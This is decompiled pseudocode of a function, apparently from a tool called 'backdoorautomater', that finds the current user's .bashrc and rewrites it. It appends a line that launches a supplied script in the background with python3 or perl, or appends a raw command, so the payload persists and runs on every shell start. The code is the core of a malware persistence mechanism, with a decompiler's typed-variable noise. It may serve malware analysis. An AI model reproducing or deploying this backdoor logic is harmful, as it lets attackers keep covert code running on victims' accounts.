fn backdoorautomater::shellscript::modify_bashrc(a0: &struct24, a1: i32) -> u64 {
    let v0: std::fs::File;  // [bp-0x314]
    let v1: alloc::string::String;  // [bp-0x308], Other Possible Types: alloc::vec::Vec<u8, alloc::alloc::Global>
    let v2: alloc::borrow::Cow<str>;  // [bp-0x308], Other Possible Types: alloc::vec::Vec<u8, alloc::alloc::Global>, core::result::Result<std::fs::File, std::io::error::Error>
    let v3: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x308]
    let v4: struct24;  // [bp-0x308]
    let v5: alloc::string::String;  // [bp-0x308]
    let v6: alloc::string::String;  // [bp-0x308]
    let v7: u32;  // [bp-0x304]
    let v8: u64;  // [bp-0x300]
    let v9: Option<struct24>;  // [bp-0x2d0]
    let v10: struct24;  // [bp-0x2d0]
    let v11: struct24;  // [bp-0x2b8]
    let v12: void*;  // [bp-0x2a0], Other Possible Types: struct16
    let v13: u64;  // [bp-0x298]
    let v14: void*;  // [bp-0x290]
    let v15: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x288], Other Possible Types: u128
    let v16: u64;  // [bp-0x280]
    let v17: u64;  // [bp-0x278]
    let v18: struct149;  // [bp-0x278]
    let v19: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x268]
    let v20: struct149;  // [bp-0x258], Other Possible Types: u64
    let v21: u64;  // [bp-0x240]
    let v22: &str;  // [bp-0x238], Other Possible Types: struct149, struct24, struct32, u128
    let v23: struct24;  // [bp-0x238], Other Possible Types: u128
    let v24: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x238], Other Possible Types: u128
    let v25: u128;  // [bp-0x238]
    let v26: &str;  // [bp-0x238]
    let v27: &str;  // [bp-0x238]
    let v28: u32;  // [bp-0x234]
    let v29: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x228], Other Possible Types: struct24, struct149, u128
    let v30: u128;  // [bp-0x218]
    let v31: std::io::stdio::Stdin;  // [bp-0x168]
    let v32: u64;  // [bp-0x158]
    let v33: struct24;  // [bp-0x148]
    let v34: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x128]
    let v35: u64;  // [bp-0x118]
    let v36: u64;  // [bp-0x108]
    let v37: u64;  // [bp-0x100]
    let v38: u64;  // [bp-0xf8]
    let v39: struct56;  // [bp-0xf0]
    let v40: u64;  // [bp-0xe8]
    let v41: u64;  // [bp-0xd0]
    let v42: struct24;  // [bp-0xb8]
    let v43: struct149;  // [bp-0xa8]
    let v44: struct24;  // [bp-0x98]
    let v45: struct24;  // [bp-0x88]
    let v46: struct44;  // [bp-0x78]
    let v47: u128;  // [bp-0x68]
    let v48: u128;  // [bp-0x58]
    let v49: alloc::string::String;  // [bp-0x48]
    let v53: u32;  // rdx
    let v56: u64;  // rdx
    let v57: Result<(), &BOT>;  // r14
    let v58: u64;  // rbp
    let v59: u64;  // rax
    let v60: u32;  // eax

    println!("\nTrying to find the .bashrc file of the current user and rewrite it ! \n");
    v22 = <T as alloc::slice::hack::ConvertVec>::to_vec("whoami");
    v32 = v29;
    v31 = *(&v22.field_0 as &i128);
    v22 = std::process::Command::new("sh");
    v2 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v22, "-c"), &v31));
    v39 = core::result::Result<T,E>::expect(&v2, "src/shellscript.rs");
    v2 = alloc::string::String::from_utf8_lossy(v41, *((&v39.field_32 as &char + 8) as &i64));
    v22 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v2), v53);
    v33 = v23;
    backdoorautomater::sanitizer::sanitize_system_command(&v33);
    v2 = alloc::string::String::from_utf8_lossy(v40, v39.field_16 as i64);
    v22 as u192 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v2), v53);
    v35 = v29;
    *(&v34.buf.cap as &i128) = *(&v23.field_0 as &i128);
    v22 = "/home/";
    *(&v29.buf.cap as &i128) = *(&v34.buf.ptr as &i128);
    v3 = alloc::str::join_generic_copy(&v22 as u192, 2, 1, 0);
    v56 = v3.len;
    v17 = v3.len;
    v15 = *(&v3.buf.cap as &i128);
    alloc::str::<impl str>::replace(&v22 as u192, v16, v56);
    v15 = v24;
    alloc::vec::Vec<T,A>::extend_from_slice(&v15, "/.bashrc");
    v26 = std::fs::File::open(&v15);
    if let Err(_) = v26 {
        return v57;
    }
    v46 = std::io::buffered::bufreader::BufReader<R>::with_capacity(0x2000, v28);
    v12 = 0;
    v13 = 8;
    v14 = 0;
    v30 = v48;
    v29 = v47;
    v24 = *(&v46.field_0 as &i128);
    v21 = 9223372036854775809;
    loop {
        v4 = <std::io::Lines<B> as core::iter::traits::iterator::Iterator>::next(&v26);
        v58 = v4.field_0;
        if v58 != v21 {
            v57 = v8;
            if v58 == 0x8000000000000000 {
                break;
            }
            v36 = v58;
            v37 = v57;
            v38 = v4.field_16;
            v12 = alloc::vec::Vec<T,A>::push(&v36);
        } else {
            v29 = v18;
            v25 = *(&v15.buf.cap as &i128);
            v2 = std::fs::File::create(&v26, v53);
            match v2 {
                Err(v57) => {
                    break;
                },
                Ok(v0) => {
                    v59 = a1 as u64;
                    if v59 as u8 != 1 {
                        v60 = v59 as u32;
                        if v60 == 2 {
                            v26 = "perl ";
                            v29 = *((a0 + 8) as &i128) as u128;
                            v2 = alloc::str::join_generic_copy(&v26, 2, 1, 0);
                            v19 = v1;
                            alloc::vec::Vec<T,A>::extend_from_slice(&v19, " &");
                            v23 as u192 = <T as alloc::slice::hack::ConvertVec>::to_vec("\n");
                            v45 = v29;
                            v44 = *(&v22.field_0 as &i128);
                            v12 = alloc::vec::Vec<T,A>::push(&v44);
                            v29 = v20;
                            v23 = *(&v19.buf.cap as &i128) as u128;
                            v12 = alloc::vec::Vec<T,A>::push(&v23 as u192);
                            v22 = <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(&v12);
                            v9 = <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v22);
                            if let Some(v11) = v9 {
                                loop {
                                    v6 = <alloc::string::String as core::clone::Clone>::clone(&v11);
                                    alloc::vec::Vec<T,A>::extend_from_slice(&v6, "\n");
                                    v57 = std::io::Write::write_all(&v0, v8, v6.vec.len);
                                    if let Err(_) = v57 {
                                        break;
                                    }
                                    v9 = <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v22);
                                    if let None = v9 {
                                        break;
                                    }
                                }
                            }
                        } else if v60 == 3 {
                            v49 = <alloc::string::String as core::clone::Clone>::clone(a0);
                            v12 = alloc::vec::Vec<T,A>::push(&v49);
                            v22 = <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(&v12);
                            v9 = <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v22);
                            if let Some(v11) = v9 {
                                loop {
                                    v5 = <alloc::string::String as core::clone::Clone>::clone(&v11);
                                    alloc::vec::Vec<T,A>::extend_from_slice(&v5, "\n");
                                    v57 = std::io::Write::write_all(&v0, v8, v5.vec.len);
                                    if let Err(_) = v57 {
                                        break;
                                    }
                                    v9 = <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v22);
                                    if let None = v9 {
                                        break;
                                    }
                                }
                            }
                        }
                    } else {
                        v27 = "python3 ";
                        v29 = *((a0 + 8) as &i128) as u128;
                        v2 = alloc::str::join_generic_copy(&v26, 2, 1, 0);
                        v19 = v1;
                        alloc::vec::Vec<T,A>::extend_from_slice(&v19, " &");
                        v22 as u192 = <T as alloc::slice::hack::ConvertVec>::to_vec("\n");
                        v43 = v29;
                        v42 = *(&v23.field_0 as &i128);
                        v12 = alloc::vec::Vec<T,A>::push(&v42);
                        v29 = v20;
                        v22 = *(&v19.buf.cap as &i128) as u128;
                        v12 = alloc::vec::Vec<T,A>::push(&v22 as u192);
                        v22 = <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(&v12);
                        v9 = <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v22);
                        if let Some(v11) = v9 {
                            loop {
                                v1 = <alloc::string::String as core::clone::Clone>::clone(&v11);
                                alloc::vec::Vec<T,A>::extend_from_slice(&v1, "\n");
                                v57 = std::io::Write::write_all(&v0, v8, v1.vec.len);
                                if let Err(_) = v57 {
                                    break;
                                }
                                v9 = <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v22);
                                if let None = v9 {
                                    break;
                                }
                            }
                        }
                    }
                },
            }
        }
    }
    return v57;
}
